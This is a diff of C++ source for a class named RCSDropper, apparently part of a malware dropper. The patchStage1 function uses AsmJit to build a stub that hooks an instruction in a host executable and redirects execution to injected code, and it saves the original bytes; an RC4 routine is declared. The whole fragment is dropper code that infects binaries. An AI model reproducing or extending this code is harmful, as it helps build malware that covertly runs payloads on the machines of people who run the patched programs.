@@ -33,33 +33,33 @@ static void rc4crypt(
         unsigned char *data,
         size_t data_len);
 
-void RCSDropper::patchStage1(char* ptr, DWORD VA, DWORD jumpToVA)
+void RCSDropper::patchStage1(char* ptr, DWORD VA, DWORD stubVA)
 {
     (void) VA;
     
     AsmJit::Assembler stub;
     
-    disassembled_instruction instr = hookedInstruction_;
-    switch (instr.d.Instruction.BranchType) {
+    switch (hookedInstruction_.d.Instruction.BranchType) {
         case JmpType:
         {
-            DWORD addr = ((DWORD) instr.d.EIP) + (jumpToVA - instr.d.VirtualAddr);
-            addr += sizeof(DWORD); // account for initial 4 bytes containing address of next byte
-            cout << "Stage1 stub: call 0x" << hex << jumpToVA << dec << std::endl;
-            stub.call(addr);
+            // account for initial 4 bytes containing address of next byte
+            DWORD codeVA = stubVA + sizeof(DWORD);
+            DWORD addr = (DWORD) ptr + codeVA - (DWORD)hookedInstruction_.d.VirtualAddr;
+            std::cout << "Stage1 stub: call 0x" << hex << codeVA << dec << std::endl;
+            stub.call( (void*) addr );
         }
         break;
         case CallType:
         {
-            cout << "Stage1 stub: call dword ptr ds:[0x" << hex << jumpToVA << "]" << dec << std::endl;
-            stub.call(AsmJit::dword_ptr_abs( (void*)jumpToVA ));
+            cout << "Stage1 stub: call dword ptr ds:[0x" << hex << stubVA << "]" << dec << std::endl;
+            stub.call(AsmJit::dword_ptr_abs( (void*)stubVA ));
         }
         break;
     }
     
     // save original code
     DropperHeader* h = header();
-    h->stage1.VA = VA;
+    h->stage1.VA = hookedInstruction_.d.VirtualAddr;
     h->stage1.size = stub.codeSize();
     h->stage1.offset = offset_.stage1 - offset_.header; // offsets are header based here
     memcpy( ptr_( offset_.stage1 ), ptr, h->stage1.size);
